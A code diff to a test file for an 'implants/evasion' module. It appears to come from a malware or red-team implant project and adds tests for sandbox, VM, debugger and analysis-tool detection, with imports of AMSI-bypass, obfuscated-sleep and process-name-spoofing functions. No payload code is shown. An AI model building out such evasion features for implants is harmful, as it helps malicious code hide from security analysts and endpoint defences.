@@ -1,17 +1,26 @@
-"""Tests for implants/evasion.py — sandbox/VM detection."""
+"""Tests for implants/evasion.py — sandbox/VM detection and operational evasion."""
 
 import sys
 import platform
+import time
 
 import pytest
 
 from implants.evasion import (
+    _cpu_core_count,
     _cpu_has_vm_string,
+    _debugger_attached,
+    _disk_size_gb,
     _dmi_has_vm_string,
     _mac_ouis,
     _process_count,
+    _timing_accelerated,
+    _total_ram_mb,
     _uptime_seconds,
+    _analysis_tools_running,
+    amsi_bypass,
     is_sandbox,
+    obfuscated_sleep,
     sandbox_checks,
     spoof_process_name,
 )
@@ -67,6 +76,7 @@ class TestSandboxChecks:
     def test_has_all_expected_keys(self):
         result = sandbox_checks()
         expected_keys = {
+            # Original checks
             "low_uptime",
             "sandbox_user",
             "sandbox_hostname",
@@ -74,8 +84,23 @@ class TestSandboxChecks:
             "vm_cpu_string",
             "vm_dmi_string",
             "low_process_count",
+            # Hardware fingerprinting
+            "low_ram",
+            "low_cpu_cores",
+            "small_disk",
+            # Debugger / analysis tools
+            "debugger_attached",
+            "analysis_tools",
         }
-        assert set(result.keys()) == expected_keys
+        assert expected_keys.issubset(set(result.keys()))
+
+    def test_timing_check_key_absent_by_default(self):
+        result = sandbox_checks()
+        assert "timing_accelerated" not in result
+
+    def test_timing_check_key_present_when_requested(self):
+        result = sandbox_checks(timing_check=True)
+        assert "timing_accelerated" in result
 
     def test_all_values_are_bool(self):
         result = sandbox_checks()
@@ -106,8 +131,8 @@ class TestIsSandbox:
         assert isinstance(is_sandbox(min_hits=0), bool)
 
     def test_min_hits_high_is_false(self):
-        # Requiring all 7 checks to fire should never trigger on a real machine
-        assert is_sandbox(min_hits=7) is False
+        # Requiring all 12 checks to fire should never trigger on a real machine
+        assert is_sandbox(min_hits=12) is False
 
     def test_is_sandbox_with_mocked_hits(self, monkeypatch):
         """Artificially inject hits to verify threshold logic."""
